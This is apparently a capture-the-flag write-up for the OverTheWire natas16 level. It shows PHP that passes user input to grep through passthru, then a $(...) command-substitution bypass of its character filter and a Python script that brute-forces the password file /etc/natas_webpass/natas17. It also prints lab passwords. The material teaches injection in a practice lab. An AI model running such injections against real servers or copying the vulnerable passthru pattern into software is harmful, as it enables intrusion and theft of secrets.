This is a more secure version of `natas9`. 

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
	$key = $_REQUEST["needle"];
}

if($key != "") {
	if(preg_match('/[;|&`\'"]/',$key)) {
		print "Input contains an illegal character!";
	} else {
		passthru("grep -i \"$key\" dictionary.txt");
	}
}
?>
```

It filters for specific characters, preventing us from doing the same thing as `natas9`. When this program runs the `passthru` command, the key is enclosed in quotes, making it a string. So regularly, we can't execute strings. But if we use `$()`, we could actually execute it. We can test this hypothesis by typing this text into the input:

```sh
$(echo Asians)
```

This gave us "*Asians*". So we can execute commands from this. However, we can just do `$(cat /etc/natas_webpass/natas17)` because the output of this command will be fed into the outer grep command, which will give us nothing. So we need to brute force this just like the previous level.

Since the output of the inner command will be fed into the outer grep command, we could try grepping each characters to derive the password. We can combine the output of the inner grep command with a word that we know is in `dictionary.txt` like "*Asians*" for example. If we don't find the correct character, then the output of the inner command will be empty, which won't affect the outer command's grepping for "*Asians*" and it would still output "Asians". But if we do find the correct character, then the output of the inner command will be combined with "*Asians*", making it so that we the outer grep command will be grepping for "*inner_command_output + Asians*" instead of just "*Asians*". So all we need to do is try to derive each of the 32 characters. We could do this using a similar script to `natas15` (since it didn't specify any POST request when uploading the input into the script, we'll use GET requests):

```python
import requests
import string

url = 'http://natas16.natas.labs.overthewire.org'
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

characters = string.ascii_letters + string.digits
flag = ''

for i in range(32):
    for char in characters:
        command = '$(grep -E ^%s%c.* /etc/natas_webpass/natas17)Asians' % (flag, char)
        response = requests.get(url, auth=(username, password), params={"needle" : command})
        
        if "Asians" not in response.text:
            flag += char
            print(f'Building flag: {flag}')
            break

print(f'Complete flag: {flag}')
```

The regex (used with `-E` for extended regex):
- `^` means assert position at the start of the line
- `%s%c` are placeholder, helps us combine both the flag being built and testing the next correct character.
- `.` matches any character (except for line terminators)
- `*` matches the previous token for unlimited amount of times.

Here's the output:
```
Complete flag: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
